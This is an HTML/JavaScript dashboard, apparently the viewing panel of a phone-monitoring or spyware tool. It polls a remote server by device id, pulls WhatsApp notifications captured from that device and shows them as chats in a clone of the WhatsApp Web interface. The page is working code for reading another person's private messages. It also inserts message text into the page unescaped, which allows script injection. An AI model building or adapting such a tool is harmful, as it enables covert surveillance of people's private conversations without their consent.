<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web (Live Monitor)</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* --- CSS STYLES --- */
        body { margin: 0; font-family: 'Segoe UI', sans-serif; background-color: #111b21; color: #e9edef; display: flex; height: 100vh; overflow: hidden; }

        /* Left Sidebar */
        .sidebar { width: 350px; background-color: #202c33; border-right: 1px solid #374045; display: flex; flex-direction: column; height: 100%; transition: all 0.3s ease; }
        .header { background-color: #202c33; padding: 15px; border-bottom: 1px solid #374045; display: flex; justify-content: space-between; align-items: center; color: #aebac1; }
        
        .contact-list { flex: 1; overflow-y: auto; }
        
        /* Contact Item Styling */
        .contact { display: flex; align-items: center; padding: 12px; cursor: pointer; border-bottom: 1px solid #2a3942; height: 50px; } 
        .contact:hover { background-color: #2a3942; }
        .contact.active { background-color: #2a3942; }

        .avatar { width: 45px; height: 45px; background-color: #00a884; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; margin-right: 15px; flex-shrink: 0; font-size: 18px; font-weight: bold; }
        .info { flex: 1; display: flex; align-items: center; }
        .name { font-size: 17px; color: #e9edef; font-weight: 500; }

        /* Right Chat Area */
        .chat-area { flex: 1; display: flex; flex-direction: column; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-color: #0b141a; position: relative; }
        
        .chat-header { background-color: #202c33; padding: 10px 15px; display: flex; align-items: center; border-bottom: 1px solid #374045; }
        
        .mobile-back { display: none; margin-right: 15px; font-size: 20px; color: #aebac1; cursor: pointer; }

        .messages { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 4px; }
        
        /* ðŸ”¥ NEW MESSAGE BUBBLE STYLES (Left vs Right) ðŸ”¥ */
        .msg { 
            max-width: 65%; 
            padding: 6px 10px; 
            border-radius: 8px; 
            font-size: 14.5px; 
            line-height: 1.4; 
            word-wrap: break-word; 
            color: #e9edef; 
            box-shadow: 0 1px 0.5px rgba(0,0,0,0.13); 
            position: relative; 
            margin-bottom: 4px;
        }
        
        /* Incoming (Left - Dark/Gray) */
        .msg.incoming {
            background-color: #202c33;
            align-self: flex-start; /* Left side */
            border-top-left-radius: 0;
        }

        /* Outgoing (Right - Green) */
        .msg.outgoing {
            background-color: #005c4b;
            align-self: flex-end; /* Right side */
            border-top-right-radius: 0;
        }
        
        .time { font-size: 10px; color: #8696a0; float: right; margin-left: 10px; margin-top: 6px; }

        .welcome-screen { position: absolute; top:0; left:0; width:100%; height:100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #222e35; z-index: 5; text-align: center; }

        /* --- MOBILE RESPONSIVE --- */
        @media (max-width: 768px) {
            .sidebar { width: 100%; position: absolute; z-index: 20; }
            .chat-area { width: 100%; position: absolute; z-index: 10; display: none; } 
            
            .mobile-back { display: block; }
            .welcome-screen { display: none; }

            body.chat-active .sidebar { display: none; }
            body.chat-active .chat-area { display: flex; }
        }
    </style>
</head>
<body>

    <div class="sidebar" id="sidebar">
        <div class="header">
            <span>Chats</span>
            <div style="display:flex; gap:15px;">
                <i class="fas fa-trash" onclick="clearData()" style="cursor:pointer; font-size:14px;" title="Clear Saved Data"></i>
                <i class="fas fa-sync-alt" onclick="fetchData()" style="cursor:pointer;" title="Refresh"></i>
            </div>
        </div>
        <div class="contact-list" id="contactList">
            <div style="text-align:center; padding:20px; color:#8696a0;">Loading...</div>
        </div>
    </div>

    <div class="chat-area" id="chatArea">
        <div class="welcome-screen" id="welcomeScreen">
            <i class="fab fa-whatsapp" style="font-size: 60px; color: #3d4a51; margin-bottom: 20px;"></i>
            <div style="font-size: 24px;">WhatsApp Web</div>
            <div style="font-size: 14px; color: #8696a0; margin-top: 10px;">Messages are saved locally</div>
        </div>

        <div class="chat-header" id="chatHeader" style="display:none;">
            <i class="fas fa-arrow-left mobile-back" onclick="closeChat()"></i>
            <div class="avatar" id="headerAvatar" style="width: 35px; height: 35px; font-size: 14px;"></div>
            <div style="font-size: 16px; font-weight: 500;" id="headerName">Name</div>
        </div>

        <div class="messages" id="messageBox"></div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const deviceId = urlParams.get('id');
        // Ensure we are fetching the CHAT LOGS or NOTIFICATIONS correctly
        const API_URL = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;
        
        const STORAGE_KEY = `whatsapp_data_${deviceId || 'default'}`;

        let groupedChats = {};
        let activeChatUser = null; 

        // 1. Load Data from LocalStorage (Instant Show)
        function loadFromStorage() {
            const savedData = localStorage.getItem(STORAGE_KEY);
            if (savedData) {
                groupedChats = JSON.parse(savedData);
                renderSidebar(); 
                console.log("Loaded from Storage");
            }
        }

        // 2. Fetch New Data
        async function fetchData() {
            if (!deviceId) return;
            try {
                const res = await fetch(API_URL);
                const data = await res.json();
                
                // Filter WhatsApp Only
                const filtered = data.filter(d => (d.packageName || "").includes("whatsapp") || (d.appName || "").toLowerCase().includes("whatsapp"));
                
                processChats(filtered);
            } catch (e) { console.error(e); }
        }

        // 3. Process & Save
        function processChats(data) {
            let tempGrouped = {};
            
            data.forEach(msg => {
                // Determine Chat Group Name
                // Logic: Agar notification title "You" hai, to use ignore karo ya 'Self' me dalo
                // Lekin Notification listener me aksar Sender ka naam Title me hota hai.
                
                let chatPartnerName = msg.title || "Unknown";
                
                // Cleanup: Agar number hai to format kar sakte ho
                if (!tempGrouped[chatPartnerName]) tempGrouped[chatPartnerName] = [];
                tempGrouped[chatPartnerName].push(msg);
            });

            if (Object.keys(tempGrouped).length > 0) {
                // Merge new data with old data logic can be added here, 
                // but for now we replace to keep it synced.
                groupedChats = tempGrouped;
                localStorage.setItem(STORAGE_KEY, JSON.stringify(groupedChats));
            }

            renderSidebar();

            if (activeChatUser) {
                renderMessages(activeChatUser, true); 
            }
        }

        // 4. Render Sidebar (Sorted by Time)
        function renderSidebar() {
            const list = document.getElementById('contactList');
            list.innerHTML = "";
            
            const sortedNames = Object.keys(groupedChats).sort((a, b) => {
                const msgsA = groupedChats[a];
                const msgsB = groupedChats[b];
                const timeA = msgsA[msgsA.length - 1]?.postTime || 0;
                const timeB = msgsB[msgsB.length - 1]?.postTime || 0;
                return timeB - timeA; 
            });

            if (sortedNames.length === 0) {
                list.innerHTML = `<div style="text-align:center; padding:20px; color:#8696a0;">No chats found</div>`;
                return;
            }

            sortedNames.forEach(name => {
                // "You" ya "Self" naam ka group sidebar me na dikhaye to better hai
                // agar dikhana hai to ye check hata do
                if (name.toLowerCase() === 'whatsapp') return; 

                const div = document.createElement('div');
                div.className = 'contact';
                if (name === activeChatUser) div.classList.add('active');
                
                div.onclick = () => openChat(name);
                
                // Last Message Preview
                const lastMsg = groupedChats[name][groupedChats[name].length - 1];
                const previewText = lastMsg.text.length > 30 ? lastMsg.text.substring(0, 30) + "..." : lastMsg.text;

                div.innerHTML = `
                    <div class="avatar">${name.charAt(0).toUpperCase()}</div>
                    <div class="info">
                        <div style="display:flex; flex-direction:column; width:100%;">
                            <div style="display:flex; justify-content:space-between;">
                                <span class="name">${name}</span>
                                <span style="font-size:11px; color:#8696a0;">${new Date(parseInt(lastMsg.postTime)).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</span>
                            </div>
                            <div style="font-size:13px; color:#8696a0; margin-top:3px;">${previewText}</div>
                        </div>
                    </div>
                `;
                list.appendChild(div);
            });
        }

        function openChat(name) {
            activeChatUser = name;
            
            document.body.classList.add('chat-active');
            document.getElementById('welcomeScreen').style.display = 'none';
            document.getElementById('chatHeader').style.display = 'flex';
            document.getElementById('headerName').innerText = name;
            document.getElementById('headerAvatar').innerText = name.charAt(0).toUpperCase();

            renderSidebar(); 
            renderMessages(name, false); 
        }

        // ðŸ”¥ MAIN LOGIC FOR LEFT / RIGHT BUBBLES
        function renderMessages(name, isAutoRefresh) {
            const box = document.getElementById('messageBox');
            const isScrolledToBottom = box.scrollHeight - box.clientHeight <= box.scrollTop + 50;

            if (!groupedChats[name]) return;

            let rawMsgs = groupedChats[name].sort((a, b) => a.postTime - b.postTime);
            let uniqueMsgs = [];
            let lastText = "";

            // Duplicate remover
            rawMsgs.forEach(msg => {
                let currentText = msg.text.trim();
                if (!currentText) return;
                if (currentText === lastText) return;
                uniqueMsgs.push(msg);
                lastText = currentText;
            });

            let htmlContent = "";
            uniqueMsgs.forEach(msg => {
                
                // --- ðŸš€ SENT vs RECEIVED LOGIC ---
                // Default: Incoming (Left)
                let msgClass = "incoming";
                
                // Check 1: Agar title "You", "Me", "Self" hai
                if (msg.title && (msg.title.toLowerCase() === 'you' || msg.title.toLowerCase() === 'me' || msg.title.toLowerCase() === 'self')) {
                    msgClass = "outgoing";
                }
                
                // Check 2: Agar text "You: " se start ho raha hai (Notification style)
                if (msg.text.startsWith("You:") || msg.text.includes("You:")) {
                    msgClass = "outgoing";
                    // "You:" hatane ke liye (Optional)
                    msg.text = msg.text.replace("You:", "").trim();
                }

                htmlContent += `
                    <div class="msg ${msgClass}">
                        ${msg.text} 
                        <span class="time">${new Date(parseInt(msg.postTime)).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</span>
                    </div>`;
            });

            box.innerHTML = htmlContent;

            if (!isAutoRefresh || isScrolledToBottom) {
                box.scrollTop = box.scrollHeight;
            }
        }

        function closeChat() {
            activeChatUser = null;
            document.body.classList.remove('chat-active');
            renderSidebar();
        }

        function clearData() {
            if(confirm("Are you sure you want to clear saved chats?")) {
                localStorage.removeItem(STORAGE_KEY);
                location.reload();
            }
        }

        loadFromStorage();
        fetchData();
        setInterval(fetchData, 2000);

    </script>
</body>
</html>
